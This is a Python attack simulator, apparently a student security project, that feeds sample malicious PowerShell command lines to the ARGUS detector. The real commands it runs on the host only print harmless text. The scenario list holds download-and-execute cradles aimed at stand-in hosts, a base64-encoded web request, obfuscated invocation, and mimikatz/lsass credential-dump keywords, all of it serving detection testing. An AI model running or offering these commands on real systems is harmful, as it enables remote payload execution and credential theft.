"""
ARGUS — Suspicious PowerShell Attack Simulator
=============================================
This script demonstrates ARGUS detecting malicious PowerShell activity
using the PowerShellDetector engine and Windows Event ID 4104 (ScriptBlock Logging).

DETECTION RULES TESTED:
  1. Base64 Encoded Commands (-enc, -encodedcommand)
  2. Execution Policy Bypass (-executionpolicy bypass, -ep bypass)
  3. Remote Download Cradles (downloadstring, downloadfile, invoke-webrequest, iwr, start-bitstransfer)
  4. In-Memory Script Execution (invoke-expression, iex, invoke-command)
  5. Obfuscation Techniques (frombase64string, replace, [char], -join)
  6. Hidden Window Execution (-windowstyle hidden, -w hidden, -nop, -noprofile)
  7. Credential Dumping & Security Probing (sekurlsa, mimikatz, lsass, credential, securitycenter)
  8. Suspicious Parent Applications (WINWORD.EXE, excel.exe, chrome.exe)

USAGE:
  cd backend
  python simulate_powershell.py
"""

import subprocess
import time
import sys
import os
import urllib.request
import json
from datetime import datetime, timezone

# Fix Windows terminal encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    os.system("")  # Enable ANSI colors

# Ensure backend root is on sys.path
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
if CURRENT_DIR not in sys.path:
    sys.path.insert(0, CURRENT_DIR)

try:
    from app.detection.powershell_detector import PowerShellDetector
except ImportError:
    PowerShellDetector = None

ARGUS_API = "http://127.0.0.1:8000"

# ─────────────────────────────────────────────────────────────────────────────
# Test Scenarios (MITRE ATT&CK Aligned)
# ─────────────────────────────────────────────────────────────────────────────

SCENARIOS = [
    {
        "id": "PS-01",
        "name": "Encoded Command with Execution Policy Bypass",
        "technique": "T1059.001 / T1027 Obfuscated Command",
        "description": "Base64 encoded payload executed with hidden window & policy bypass",
        "command_line": (
            "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden "
            "-EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AdABlAHMAdAAiAA=="
        ),
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "integrity_level": "Medium",
        # Benign real command executed on host to trigger Event ID 4104 safely
        "real_cmd": ["powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", "Write-Output 'ARGUS_SIM_ENCODED_CMD'"],
    },
    {
        "id": "PS-02",
        "name": "In-Memory Web Download Cradle (IEX + DownloadString)",
        "technique": "T1059.001 / T1105 Ingress Tool Transfer",
        "description": "Classic fileless payload downloader executing remote script directly in memory",
        "command_line": (
            "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://threat-c2.test/stage2.ps1')\""
        ),
        "parent_image": r"C:\Windows\explorer.exe",
        "integrity_level": "Medium",
        "real_cmd": ["powershell.exe", "-NoProfile", "-Command", "$test = 'DownloadString simulation'; Write-Output 'ARGUS_DOWNLOAD_CRADLE'"],
    },
    {
        "id": "PS-03",
        "name": "Credential Access & Antivirus Discovery Recon",
        "technique": "T1003 Credential Dumping / T1082 Discovery",
        "description": "Reconnaissance querying SecurityCenter antivirus and auditing lsass credentials",
        "command_line": (
            "powershell.exe -Command \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct; "
            "# sekurlsa mimikatz lsass credential dump\""
        ),
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "integrity_level": "System",
        "real_cmd": ["powershell.exe", "-NoProfile", "-Command", "Write-Output 'ARGUS_CREDENTIAL_AUDIT_CHECK'"],
    },
    {
        "id": "PS-04",
        "name": "Obfuscated Dynamic Invocation via Type Casting",
        "technique": "T1027.013 Obfuscated Char Arrays",
        "description": "Script reconstruction using char arrays and FromBase64String decoding",
        "command_line": (
            "powershell.exe -Command \"$raw = [System.Convert]::FromBase64String('VGVzdA=='); "
            "$func = [char]105 + [char]101 + [char]120; invoke-expression ($raw -join '')\""
        ),
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "integrity_level": "Medium",
        "real_cmd": ["powershell.exe", "-NoProfile", "-Command", "Write-Output 'ARGUS_OBFUSCATION_SIM'"],
    },
    {
        "id": "PS-05",
        "name": "Phishing Macro Spawning BITS File Transfer",
        "technique": "T1197 BITS Jobs / T1204.002 Malicious Macro",
        "description": "Microsoft Word spawning PowerShell BITS transfer to drop second-stage binary",
        "command_line": (
            "powershell.exe -w hidden -nop -ep bypass -Command \"Start-BitsTransfer -Source http://payload.test/drop.exe -Destination $env:TEMP\\drop.exe\""
        ),
        "parent_image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "integrity_level": "Medium",
        "real_cmd": ["powershell.exe", "-NoProfile", "-Command", "Write-Output 'ARGUS_BITS_MACRO_SIM'"],
    },
]


def print_banner():
    print()
    print("=" * 70)
    print("  ARGUS  —  SUSPICIOUS POWERSHELL ATTACK SIMULATOR")
    print("=" * 70)
    print()
    print("  This simulator executes realistic adversary PowerShell techniques")
    print("  evaluated by ARGUS's PowerShellDetector and Windows Event 4104.")
    print()
    print("  Attack Vectors Tested:")
    print("    1. Encoded Command with ExecutionPolicy Bypass (-enc, -ep bypass)")
    print("    2. In-Memory Download Cradle (DownloadString + IEX)")
    print("    3. Credential Access & SecurityCenter Discovery (Mimikatz / LSASS)")
    print("    4. Obfuscation via Char Arrays & FromBase64String")
    print("    5. Office Macro Phishing Child (WINWORD.EXE -> Start-BitsTransfer)")
    print()
    print("=" * 70)
    print()


def check_argus_running():
    try:
        resp = urllib.request.urlopen(f"{ARGUS_API}/api/status", timeout=5)
        return True, json.loads(resp.read().decode())
    except Exception:
        return False, None


def get_current_stats():
    try:
        resp = urllib.request.urlopen(f"{ARGUS_API}/api/status", timeout=5)
        return json.loads(resp.read().decode())
    except Exception:
        return None


def get_recent_powershell_alerts(limit=50):
    try:
        resp = urllib.request.urlopen(f"{ARGUS_API}/api/alerts?limit={limit}", timeout=5)
        alerts = json.loads(resp.read().decode())
        return [
            a for a in alerts
            if a.get("type") == "SUSPICIOUS_POWERSHELL" or a.get("detector") == "powershell_detector"
        ]
    except Exception:
        return []


def send_powershell_event_to_api(event_dict):
    """Submit PowerShell event to ARGUS API."""
    try:
        url = f"{ARGUS_API}/api/events/powershell"
        payload = json.dumps(event_dict).encode("utf-8")
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        resp = urllib.request.urlopen(req, timeout=5)
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        return {"status": "http_error", "code": e.code, "message": str(e)}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def main():
    print_banner()

    # ── Step 1: Pre-flight check ───────────────────────────────
    print("[1/3] Checking ARGUS SOC Server Connection...")
    online, stats = check_argus_running()
    if not online:
        print()
        print("  [ERROR] ARGUS server is not reachable at", ARGUS_API)
        print("  Please start the server first:")
        print("    cd backend")
        print("    python server.py")
        print()
        sys.exit(1)

    print(f"  [OK] ARGUS online — Total alerts: {stats.get('total_alerts', 0)} (Windows: {stats.get('windows_alerts', 0)})")
    print()

    # Instantiate local detector for ground-truth verification
    local_detector = PowerShellDetector() if PowerShellDetector else None

    # ── Step 2: Execute Scenarios ──────────────────────────────
    print("[2/3] Simulating Suspicious PowerShell Commands...")
    print("  Watch real-time alerts appear on dashboard: http://localhost:8000")
    print("-" * 70)

    results = []

    for idx, sc in enumerate(SCENARIOS, 1):
        print()
        print(f"  [{idx}/{len(SCENARIOS)}] {sc['id']}: {sc['name']}")
        print(f"       Technique : {sc['technique']}")
        print(f"       Command   : {sc['command_line'][:65]}...")

        # 1. Execute safe real command on host to trigger Event ID 4104
        if sc.get("real_cmd"):
            try:
                p = subprocess.run(
                    sc["real_cmd"],
                    capture_output=True,
                    timeout=5,
                    text=True
                )
                print(f"       [Host Log] Event ID 4104 generated in Microsoft-Windows-PowerShell/Operational")
            except Exception as e:
                print(f"       [Host Log] Execution note: {e}")

        # Construct payload event
        event_payload = {
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": sc["command_line"],
            "parent_image": sc.get("parent_image"),
            "integrity_level": sc.get("integrity_level", "Medium"),
            "user": "DESKTOP\\Student",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

        # 2. Local detector evaluation
        local_res = None
        if local_detector:
            local_res = local_detector.process_event(event_payload)
            sev = local_res.get("severity", "HIGH")
            score = local_res.get("risk_score", 0)
            print(f"       [Detector] Risk Score: {score}/100 | Severity: {sev}")
            for r in local_res.get("reasons", []):
                print(f"         - {r}")

        # 3. Ingest into ARGUS API
        api_res = send_powershell_event_to_api(event_payload)
        if api_res.get("status") == "alert":
            aid = api_res.get("alert", {}).get("id", "PS-ALERT")
            print(f"       [ARGUS API] SUCCESS -> Alert broadcast: {aid}")
        elif api_res.get("status") == "http_error" and api_res.get("code") in (404, 405):
            print(f"       [ARGUS API] Note: Endpoint /api/events/powershell pending server reload.")
        else:
            print(f"       [ARGUS API] Status: {api_res.get('status')}")

        results.append({
            "scenario": sc,
            "local_res": local_res,
            "api_res": api_res,
        })

        time.sleep(1.2)

    # ── Step 3: Verification & Summary Report ─────────────────
    print()
    print("-" * 70)
    print("[3/3] Generating SOC Verification Report...")
    print()

    time.sleep(1.5)
    recent_alerts = get_recent_powershell_alerts(limit=20)

    print("=" * 70)
    print("  SIMULATION RESULTS & VERIFICATION")
    print("=" * 70)
    print(f"  PowerShell scenarios executed  : {len(SCENARIOS)}")
    print(f"  Suspicious commands flagged    : {sum(1 for r in results if r['local_res'] and r['local_res']['alert'])}")
    print(f"  Live PowerShell alerts in ARGUS: {len(recent_alerts)}")
    print()

    print("  DETECTION BREAKDOWN BY SCENARIO:")
    print("  " + "-" * 66)
    for idx, r in enumerate(results, 1):
        sc = r["scenario"]
        l = r["local_res"]
        sev = l.get("severity") if l else "HIGH"
        score = l.get("risk_score") if l else 70
        status_tag = "[FLAGGED]" if (l and l.get("alert")) else "[CLEAN]"
        print(f"    {status_tag} {sc['id']} | Risk: {score:>3}/100 ({sev:<6}) | {sc['name']}")
        if l and l.get("reasons"):
            print(f"             Reason: {l['reasons'][0]}")
    print("  " + "-" * 66)
    print()

    if recent_alerts:
        print("  LIVE ALERTS ON SOC DASHBOARD:")
        print("  " + "-" * 66)
        for idx, alt in enumerate(recent_alerts[:5], 1):
            aid = alt.get("id") or alt.get("alert_id", "?")
            sev = alt.get("severity", "HIGH")
            user = alt.get("user", "System")
            print(f"    [{idx}] {aid} | {sev} | PowerShell Execution (User: {user})")
            print(f"        {alt.get('description', '')[:75]}...")
        print("  " + "-" * 66)
        print()

    print("  [DEMO PRESENTATION FOR YOUR TEACHER]:")
    print("  1. Open http://localhost:8000 in your browser.")
    print("  2. In the 'Alerts' tab, observe the 'Suspicious PowerShell Command' cards.")
    print("  3. Click any alert to show the SOC Detail Modal:")
    print("       - Command line snippet with highlighted threat indicators")
    print("       - Matching categories (encoded_command, execution_bypass, download, etc.)")
    print("       - Parent application context (e.g. WINWORD.EXE or cmd.exe)")
    print("       - Risk Score and severity breakdown.")
    print("  4. Mention Windows Event ID 4104 (ScriptBlock Logging) as the underlying audit log.")
    print()
    print("=" * 70)
    print()


if __name__ == "__main__":
    main()
